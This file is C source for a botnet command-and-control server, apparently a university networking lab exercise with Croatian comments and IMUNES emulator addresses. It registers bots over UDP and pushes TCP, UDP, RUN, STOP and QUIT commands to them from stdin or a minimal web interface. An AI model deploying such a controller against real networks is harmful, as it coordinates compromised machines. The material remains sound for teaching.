#include <stdbool.h>
#include <stdlib.h>

#include "debug.h"
#include "structures.h"
#include "util.h"

#define BACKLOG 10
#define BUFSIZE 65536
#define FORBIDDEN 403
#define NOTFOUND 404
#define METHOD_NOT_ALLOWED 405
#define VERSION 0

#define REG "REG\n"
#define REG_PORT "5555"
#define STDIN 0

#define PROG_TCP 0
#define PROG_TCP1 1
#define PROG_UDP 2
#define PROG_UDP1 3
#define RUN 4
#define RUN2 5
#define STOP 6
#define QUIT 7

#define LIST 0
#define NEPOZNATA 1
#define HELP 2

#define max(a, b) ((a) > (b) ? (a) : (b))

static struct {
   char* ext;
   char* filetype;
} extensions[] = {{"gif", "image/gif"},       {"jpg", "image/jpg"},
                  {"jpeg", "image/jpeg"},     {"png", "image/png"},
                  {"ico", "image/ico"},       {"htm", "text/html"},
                  {"html", "text/html"},      {"txt", "text/plain"},
                  {"pdf", "application/pdf"}, {0, 0}};

static struct {
   uint8_t idx;
   char* url;
} rest_commands[] = {{PROG_TCP, "/bot/prog_tcp"},
                     {PROG_TCP1, "/bot/prog_tcp_localhost"},
                     {PROG_UDP, "/bot/prog_udp"},
                     {PROG_UDP1, "/bot/prog_udp_localhost"},
                     {RUN, "/bot/run"},
                     {RUN2, "/bot/run2"},
                     {STOP, "/bot/stop"},
                     {QUIT, "/bot/quit"},
                     {8, "/bot/list"},
                     {0, NULL}};

struct Registration {
   struct sockaddr_storage addr;
   socklen_t socklen;
};

static struct {
   struct Registration* registrations;
   size_t size;
   size_t num_el;
} registrations = {NULL, 0, 0};

struct {
   char* name;
   struct MSG msg;
} command1[8] = {{"pt", {'1', {{"10.0.0.20", "1234"}}}},                                                    // PROG_TCP
                 {"pt1", {'1', {{"127.0.0.1", "1234"}}}},                                                   // PROG_TCP1
                 {"pu", {'2', {{"10.0.0.20", "1234"}}}},                                                    // PROG_UDP
                 {"pu1", {'2', {{"127.0.0.1", "1234"}}}},                                                   // PROG_UDP1
                 {"r", {'3', {{"127.0.0.1", "vat"}, {"localhost", "6789"}}}},                               // RUN
                 {"r2", {'3', {{"20.0.0.11", "1111"}, {"20.0.0.12", "2222"}, {"20.0.0.13", "dec-notes"}}}}, // RUN2
                 {"s", {'4', {{"", ""}}}},                                                                  // STOP
                 {"q", {'0', {{"", ""}}}}};                                                                 // QUIT

struct {
   char* name;
   char* message;
} command2[3] = {
    {"l", ""},            // LIST
    {"n", "NEPOZNATA\n"}, // NEPOZNATA
    {"h", ""}             // HELP
};

static int pipefd[2]; // [0] read ... [1] write

int usage();
void getProgArgs(int argc, char* argv[], char** tcp_port);
void job(int tcp_sock, int reg_sock);
void setupFDSet(int tcp_sock, int reg_sock, fd_set* saved, fd_set* fdSet);
int handleStdin(int reg_sock);
void handleRegReq(int reg_sock);
void resizeRegistrations();
bool checkCommandName(const char* in, const char* name);
int get_idx1(const char* in);
int get_idx2(const char* in);
int sendMessagesToClients(int sock, int res);
size_t calculateBuffLen(int res);
void handleCommand2(int sock, int res);
void listReg();
void sendNepoznata(int sock);
void printHelp();
void web(int sock, int reg_sock);
void handleNewConnection(int tcp_sock, int reg_sock);
void response(int status, int sock, char* string);
void printAddressAndPort(struct sockaddr_storage* addr, socklen_t len);
void handleFileReq(int sock, char* buffer);
int handleRestReq(int sock, char buffer[65537], int reg_sock);
unsigned long listBotsHTML(char** pString);

// status 0 OK
// status 1 BAD args
// status 2 bind udp fail
// status 3 bind tcp fail
// status 4 Select fail
// status 5 realloc fail
// status 6 sendTo fail
// status 7 inet_ntop fail
// status 8 accept fail
// status 9 listen fail
// status 10 recvFrom fail
int main(int argc, char* argv[]) {
   if (argc < 1 || argc > 3) return usage();

   char* tcp_port = "80";
   getProgArgs(argc, argv, &tcp_port);

   int reg_sock = bindUDP(REG_PORT, 2);
   int tcp_sock = bindTCP(tcp_port, 3);
   Listen(tcp_sock, BACKLOG, 9, FATAL, "listen failed");

   job(tcp_sock, reg_sock);

   close(reg_sock);
   close(tcp_sock);
   free(registrations.registrations);
   close(pipefd[0]);
   close(pipefd[1]);
   return 0;
}

int usage() {
   fprintf(stderr, "./CandC [tcp_port]\n");
   return 1;
}

void getProgArgs(int argc, char* argv[], char** tcp_port) {
   if (argc == 2) *tcp_port = argv[1];
}

void job(int tcp_sock, int reg_sock) {
   registrations.size          = 2;
   registrations.registrations = (struct Registration*)malloc(sizeof(struct Registration) * registrations.size);

   pipe(pipefd);

   fd_set saved, read_fds;
   setupFDSet(tcp_sock, reg_sock, &saved, &read_fds);

   int fdMax = max(tcp_sock, pipefd[0]);
   fdMax     = max(reg_sock, fdMax);

   while (1) {
      read_fds = saved; // copy
      Select(fdMax + 1, &read_fds, NULL, NULL, NULL, 4, FATAL, NULL);

      for (int i = 0; i <= fdMax; i++) {
         if (FD_ISSET(i, &read_fds)) {
            if (i == STDIN) {
               debug_printf("new stdin command\n");
               if (handleStdin(reg_sock) == QUIT) return; // ako je quit onda zavrsi
            } else if (i == reg_sock) {
               handleRegReq(reg_sock);
            } else if (i == tcp_sock) { // new Connection
               debug_printf("new tcp connection\n");
               handleNewConnection(tcp_sock, reg_sock);
            } else if (i == pipefd[0]) {
               debug_printf("received pipefd exit\n");
               return; // QUIT from web
            }
         }
      }
   }
}
void handleNewConnection(int tcp_sock, int reg_sock) {
   struct sockaddr_storage tcp_con_addr;
   socklen_t tcp_con_socklen;
   int tcp_con_sock = Accept(tcp_sock, (struct sockaddr*)&tcp_con_addr, &tcp_con_socklen, 8, FATAL, NULL);

   printf("Received req:\n\t");
   printAddressAndPort(&tcp_con_addr, tcp_con_socklen);

   int pid;
   if ((pid = fork()) < 0) warn("fork fail");
   else {
      if (pid == 0) // child
      {
         close(tcp_sock);
         close(pipefd[0]);

         web(tcp_con_sock, reg_sock);
      } else {
         close(tcp_con_sock);
      }
   }
}

// status 9 BAD request
void web(int tcp_sock, int reg_sock) {
   char buffer[BUFSIZE + 1];
   buffer[BUFSIZE] = '\0';

   ssize_t res = read(tcp_sock, buffer, BUFSIZE);
   if (res <= 0) {
      warn("Failed to read request");
   } else if (res <= BUFSIZE)
      buffer[res] = '\0';
   else
      buffer[0] = '\0';

   for (int i = 0; i < res; i++) {
      if (buffer[i] == '\r') buffer[i] = ' ';
   }
   printf("REQ: %s\n", buffer);

   if (strncmp(buffer, "GET ", 4) && strncmp(buffer, "get ", 4))
      response(METHOD_NOT_ALLOWED, tcp_sock, "Only simple GET operation supported");

   int i;
   for (i = 4; i < BUFSIZE; i++) { /* null terminate after the second space to ignore extra stuff */
      if (buffer[i] == ' ') {      /* string is "GET URL " +lots of other stuff */
         buffer[i] = 0;
         break;
      }
   }
   for (int j = 0; j < i - 1; j++) /* check for illegal parent directory use .. */
   {
      if (buffer[j] == '.' && buffer[j + 1] == '.') {
         response(FORBIDDEN, tcp_sock, "Parent directory (..) path names not supported");
      }
   }

   if (!strncmp(&buffer[0], "GET /\0", 6) || !strncmp(&buffer[0], "get /\0", 6)) /* convert no filename to index file */
      (void)strcpy(buffer, "GET /index.html");

   int rez;
   if (!(rez = handleRestReq(tcp_sock, buffer, reg_sock))) handleFileReq(tcp_sock, buffer);

   debug_printf("web response sent\n");

   sleep(1); /* allow socket to drain before signalling the socket is closed */
   close(tcp_sock);
   close(reg_sock);

   if (rez == QUIT) Writn(pipefd[1], "", sizeof(char), IGNORE, WARN, NULL); // QUIT
   close(pipefd[1]);
   exit(0);
}

int handleRestReq(int sock, char buffer[65537], int reg_sock) {
   int res = false;

   size_t buflen = strlen(buffer);
   for (int i = 0; rest_commands[i].url != NULL; i++) {
      size_t len = strlen(rest_commands[i].url);
      if ((buflen - 4) == len && !strncmp(&buffer[4], rest_commands[i].url, len)) {
         debug_printf("Received rest request: %d\n", rest_commands[i].idx);

         if (rest_commands[i].idx != 8) sendMessagesToClients(reg_sock, rest_commands[i].idx);

         res = rest_commands[i].idx;
         if (res == 0) res++;
      }
   }

   if (res) {
      if (res == 8) {
         char* bots;
         unsigned long bots_len = listBotsHTML(&bots);

         (void)sprintf(
             buffer,
             "HTTP/1.1 200 OK\nServer: C&C/%d.0\nContent-Length: %ld\nConnection: close\nContent-Type: text/html\n\n%s",
             VERSION, bots_len, bots); /* Header + a blank line */

         free(bots);
      } else {
         (void)sprintf(
             buffer,
             "HTTP/1.1 200 OK\nServer: C&C/%d.0\nContent-Length: 0\nConnection: close\nContent-Type: text/html\n\n",
             VERSION); /* Header + a blank line */
      }
      (void)Writn(sock, buffer, strlen(buffer), IGNORE, WARN, NULL);
   }

   return res;
}
unsigned long listBotsHTML(char** pString) {
   char prefix[]           = "<html>\n<head>\n<title>List Bots</title>\n</head>\n<body>\n<h1>List Bots</h1>\n<ol>\n";
   char postfix[]          = "</ol>\n</body>\n</html>\n";
   size_t strlen0          = strlen("<li> </li>\n");
   unsigned long middleLen = (registrations.num_el * (NI_MAXHOST + NI_MAXSERV + strlen0)); // <li></li>\n = 10 + razmak
   size_t strlen1          = strlen(prefix);
   size_t strlen2          = strlen(postfix);
   long len                = (long)(strlen1 + strlen2 + middleLen + 1); // 1 za \0...

   *pString = malloc(len);
   (void)sprintf(*pString, "%s", prefix);
   size_t idx = strlen1;

   char addr_str[NI_MAXHOST];
   char port[NI_MAXSERV];
   for (size_t i = 0; i < registrations.num_el; i++) {
      struct Registration* reg = &(registrations.registrations[i]);
      Getnameinfo((struct sockaddr*)&(reg->addr), reg->socklen, addr_str, NI_MAXHOST, port, NI_MAXSERV,
                  NI_NUMERICSERV | NI_NUMERICHOST, 7, FATAL, NULL);

      sprintf((*pString) + idx, "<li>%s %s</li>\n", addr_str, port);
      idx += strlen(addr_str) + strlen(port) + strlen0;
   }
   sprintf((*pString) + idx, "%s", postfix);

   return idx + strlen2;
}

void handleFileReq(int sock, char* buffer) { /* work out the file type and check we support it */
   debug_printf("Received file request: %s\n", buffer);

   size_t buflen  = strlen(buffer);
   char* file_str = NULL;
   for (int i = 0; extensions[i].ext != 0; i++) {
      size_t len = strlen(extensions[i].ext);
      if (!strncmp(&buffer[buflen - len], extensions[i].ext, len)) {
         file_str = extensions[i].filetype;
         break;
      }
   }
   if (file_str == NULL) response(FORBIDDEN, sock, "file extension type not supported");

   FILE* file_fd;
   if ((file_fd = fopen(&buffer[5], "rb")) == NULL) { /* open the file for reading */
      response(NOTFOUND, sock, "failed to open file");
   }

   fseek(file_fd, 0, SEEK_END); /* fseek to the file end to find the length */
   long len = ftell(file_fd);
   (void)fseek(file_fd, 0, SEEK_SET); /* fseek back to the file start ready for reading */
   (void)sprintf(buffer,
                 "HTTP/1.1 200 OK\nServer: C&C/%d.0\nContent-Length: %ld\nConnection: close\nContent-Type: %s\n\n",
                 VERSION, len, file_str); /* Header + a blank line */
   (void)Writn(sock, buffer, strlen(buffer), IGNORE, WARN, NULL);

   /* send file in 8KB block - last block may be smaller */

   unsigned long ret;
   while ((ret = fread(buffer, sizeof(char), BUFSIZE, file_fd)) > 0) {
      (void)Writn(sock, buffer, ret, IGNORE, WARN, NULL);
   }
}

void response(int status, int sock, char* string) {
   switch (status) {
   case METHOD_NOT_ALLOWED:
      (void)Writn(sock,
                  "HTTP/1.1 405 Method Not Allowed\nContent-Length: 203\nConnection: close\nContent-Type: "
                  "text/html\n\n<html><head>\n<title>405 Method Not Allowed</title>\n</head><body>\n<h1>Method Not "
                  "Allowed</h1>\nThe requested URL, file type or operation is not allowed on this simple static file "
                  "webserver.\n</body></html>\n",
                  298, IGNORE, WARN, string);
      break;
   case NOTFOUND:
      (void)Writn(sock,
                  "HTTP/1.1 404 Not Found\nContent-Length: 138\nConnection: close\nContent-Type: "
                  "text/html\n\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\nThe "
                  "requested URL was not found on this server.\n</body></html>\n",
                  224, IGNORE, WARN, string);
      break;
   case FORBIDDEN:
      (void)Writn(
          sock,
          "HTTP/1.1 403 Forbidden\nContent-Length: 185\nConnection: close\nContent-Type: "
          "text/html\n\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\nThe requested "
          "URL, file type or operation is not allowed on this simple static file webserver.\n</body></html>\n",
          271, IGNORE, WARN, string);
      break;
   }

   if (status == METHOD_NOT_ALLOWED || status == NOTFOUND) err(9, "Bad request %d %s", status, string);
}

void handleRegReq(int reg_sock) {
   size_t strlen_reg = strlen(REG);
   size_t buf_size   = strlen_reg + 2; // str + \0 + 1 za provjeru
   char buf[buf_size];

   struct sockaddr_storage sock_addr;                   // &registrations.registrations[registrations.num_el].addr;
   socklen_t socklen = sizeof(struct sockaddr_storage); // &registrations.registrations[registrations.num_el].socklen;
   ssize_t res       = Recvfrom(reg_sock, buf, buf_size, 0, (struct sockaddr*)&sock_addr, &socklen, 10, FATAL, NULL);
   buf[buf_size - 1] = '\0';

   if (res != (ssize_t)strlen_reg || memcmp(buf, REG, strlen_reg) != 0) {
      warn("wrong reg message %s", buf);
      return;
   }

   if (registrations.size == registrations.num_el) resizeRegistrations();

   printf("reg: \n\t");
   printAddressAndPort(&sock_addr, socklen);

   registrations.registrations[registrations.num_el].addr    = sock_addr;
   registrations.registrations[registrations.num_el].socklen = socklen;
   registrations.num_el++;
}

int handleStdin(int reg_sock) {
   ssize_t inLen = 4;
   char in[inLen]; // max len + \0
   char delimiter = '\n';
   ssize_t rd     = readn(STDIN, in, inLen, &delimiter);

   (rd > 0 && rd < inLen) ? (in[rd] = '\0') : (in[inLen - 1] = '\0');

   if (rd > 3) warn("wrong stdin command %s", in);

   int res = get_idx1(in);
   if (res != -1) {
      return sendMessagesToClients(reg_sock, res);
   } 
   
   res = get_idx2(in);
   if (res != -1) {
      handleCommand2(reg_sock, res);
   } 
   
   if(res == -1) {
      warn("wrong stdin command %s", in);
   }
   
   return -1;
}

void handleCommand2(int sock, int res) {
   if (res == LIST) {
      listReg();
   } else if (res == NEPOZNATA) {
      sendNepoznata(sock);
   } else { // help
      printHelp();
   }
}

void printHelp() {
   printf("%7s %s\n", "pt", "bot klijentima šalje poruku PROG_TCP (struct MSG:1 10.0.0.20 1234)");
   printf("%7s %s\n", "pt1", "bot klijentima šalje poruku PROG_TCP (struct MSG:1 127.0.0.1 1234)");
   printf("%7s %s\n", "pu", "bot klijentima šalje poruku PROG_UDP (struct MSG:2 10.0.0.20 1234)");
   printf("%7s %s\n", "pu1", "bot klijentima šalje poruku PROG_UDP (struct MSG:2 127.0.0.1 1234)");

   printf("%7s %s\n", "r", "bot klijentima šalje poruku RUN s adresama lokalnog računala:");
   printf("%7s %s\n", " ", "struct MSG:3 127.0.0.1 vat localhost 6789");

   printf("%7s %s\n", "r2", "bot klijentima šalje poruku RUN s adresama računala iz IMUNES-a:");
   printf("%7s %s\n", " ", "struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 dec-notes");

   printf("%7s %s\n", "s", "bot klijentima šalje poruku STOP (struct MSG:4)");
   printf("%7s %s\n", "l", "lokalni ispis adresa bot klijenata");
   printf("%7s %s\n", "n", "šalje poruku: NEPOZNATA\\n");
   printf("%7s %s\n", "q", "bot klijentima šalje poruku QUIT i završava s radom (struct MSG:0)");
   printf("%7s %s\n", "h", "ispis naredbi");
}

void sendNepoznata(int sock) {
   for (size_t i = 0; i < registrations.num_el; i++) {
      struct Registration registration = registrations.registrations[i];
      Sendto(sock, command2[NEPOZNATA].message, strlen(command2[NEPOZNATA].message), 0,
             (struct sockaddr*)&(registration.addr), registration.socklen, 6, FATAL, NULL);
   }
}

void listReg() {
   for (size_t i = 0; i < registrations.num_el; i++) {
      struct Registration* reg = &(registrations.registrations[i]);
      printAddressAndPort(&(reg->addr), reg->socklen);
   }
}
void printAddressAndPort(struct sockaddr_storage* addr, socklen_t len) {
   char addr_str[NI_MAXHOST];
   char port[NI_MAXSERV];
   Getnameinfo((struct sockaddr*)addr, len, addr_str, NI_MAXHOST, port, NI_MAXSERV, NI_NUMERICSERV | NI_NUMERICHOST, 7, FATAL, NULL);
   printf("%s %s\n", addr_str, port);
}

void resizeRegistrations() {
   registrations.size *= 2;

   registrations.registrations = realloc(registrations.registrations, (registrations.size * sizeof(struct Registration)));
   if (registrations.registrations == NULL) errx(5, "realloc failed");
}

int get_idx1(const char* in) {
   if (checkCommandName(in, command1[PROG_TCP].name)) return PROG_TCP;

   else if (checkCommandName(in, command1[PROG_TCP1].name))
      return PROG_TCP1;
   else if (checkCommandName(in, command1[PROG_UDP].name))
      return PROG_UDP;
   else if (checkCommandName(in, command1[PROG_UDP1].name))
      return PROG_UDP1;
   else if (checkCommandName(in, command1[RUN].name))
      return RUN;
   else if (checkCommandName(in, command1[RUN2].name))
      return RUN2;
   else if (checkCommandName(in, command1[STOP].name))
      return STOP;
   else if (checkCommandName(in, command1[QUIT].name))
      return QUIT;

   return -1;
}

int get_idx2(const char* in) {
   if (checkCommandName(in, command2[LIST].name)) return LIST;

   else if (checkCommandName(in, command2[NEPOZNATA].name))
      return NEPOZNATA;
   else if (checkCommandName(in, command2[HELP].name))
      return HELP;

   return -1;
}

bool checkCommandName(const char* in, const char* name) {
   return (strlen(in) == strlen(name)) && (strncmp(in, name, strlen(name)) == 0);
}

void setupFDSet(int tcp_sock, int reg_sock, fd_set* saved, fd_set* fdSet) {
   FD_ZERO(saved);
   FD_ZERO(fdSet);

   FD_SET(STDIN, saved); // stdin == 0
   FD_SET(reg_sock, saved);
   FD_SET(tcp_sock, saved);
   FD_SET(pipefd[0], saved);
}

int sendMessagesToClients(int sock, int res) {
   size_t bufLen = calculateBuffLen(res);
   char buf[bufLen];
   memcpy(buf, &(command1[res].msg), bufLen);

   for (size_t i = 0; i < registrations.num_el; i++) {
      Sendto(sock, buf, bufLen, 0, (struct sockaddr*)&(registrations.registrations[i].addr),
             registrations.registrations[i].socklen, 6, FATAL, NULL);
   }

   if (res == QUIT) {
      return QUIT; // quit...
   }

   return -1;
}
size_t calculateBuffLen(int res) {
   if (res == PROG_TCP || res == PROG_TCP1 || res == PROG_UDP || res == PROG_UDP1)
      return (sizeof(char) + sizeof(struct addr_pair)); // command + 1 pair
   else if (res == RUN)
      return (sizeof(char) + (2 * sizeof(struct addr_pair))); // command + 2 pair
   else if (res == RUN2)
      return (sizeof(char) + (3 * sizeof(struct addr_pair))); // command + 3 pair
   else
      return sizeof(char);
}
